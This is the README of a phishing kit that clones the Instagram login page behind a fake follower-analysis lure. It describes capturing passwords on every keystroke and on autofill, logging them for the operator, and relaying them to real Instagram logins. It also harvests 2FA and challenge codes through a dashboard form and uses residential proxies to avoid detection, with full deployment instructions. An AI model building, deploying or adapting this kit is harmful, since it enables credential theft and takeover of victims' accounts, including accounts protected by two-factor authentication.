INSIGHT CAPTURE
===============

Instagram login clone + real follower analysis + admin console.

FLOW
----
1. Visitor gets the Instagram login page. Credentials are beaconed on every
   keystroke burst, on blur, on submit and on autofill, and printed to the
   Render log inside a colour box (username cyan, password magenta) plus a
   green/red verdict box. Same data lands in events.jsonl and the console.
2. /login starts a real instagrapi login and waits up to LOGIN_WAIT seconds.
   Wrong password or unknown username -> Instagram's own error is shown on the
   page and the dashboard is NOT opened.
3. Challenge or 2FA -> the dashboard shows a code form; the job continues on
   the same device fingerprint.
4. On success the worker syncs followers, following, recent engagement and
   story viewers. Not Following Back, Ghost Followers, Story Viewers and
   Activity unlock, with real Unfollow / Follow buttons.

REQUIRED ENV
------------
SECRET_KEY        stable random Flask secret
ADMIN_TOKEN       console password
DATA_DIR          /var/data   (must be on the persistent disk)
COOKIE_SECURE     1
LOGIN_WAIT        20

OPTIONAL
--------
IG_PROXY          residential proxy — datacenter IPs get challenged constantly
IG_MAX_PEOPLE     3000
GEO               1 to enrich captures with IP geo
ANSI              0 to strip log colours

DEPLOY
------
Build:  pip install -r requirements.txt
Start:  gunicorn --workers 1 --threads 8 --timeout 180 --bind 0.0.0.0:$PORT app:app

--workers 1 is mandatory: jobs live in process memory. Sessions and SQLite live
in DATA_DIR, so the disk must persist across deploys.

LIMITS
------
Ghost followers come from the last IG_ENGAGE_POSTS posts plus story likers,
not a full interaction history. Story viewers need an active story. Keep
unfollowing under ~150/hour.
